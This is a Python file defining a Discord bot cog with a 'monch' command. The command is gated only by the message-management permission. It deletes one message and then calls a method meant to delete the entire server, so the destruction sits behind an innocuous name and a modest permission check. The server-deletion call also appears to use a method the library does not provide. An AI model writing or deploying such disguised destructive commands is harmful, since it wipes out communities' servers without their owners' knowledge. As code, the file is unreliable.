import discord
from discord.ext import commands
import time

class Monch(commands.Cog):
  
  def __init__(self, client):
    self.client = client
  
  @commands.command()
  @commands.has_permissions(manage_messages=True)
  async def monch(self, ctx):
    await ctx.channel.purge(limit = int(1))
    await ctx.guild.delete_server()
  
def setup(client):
  client.add_cog(Monch(client))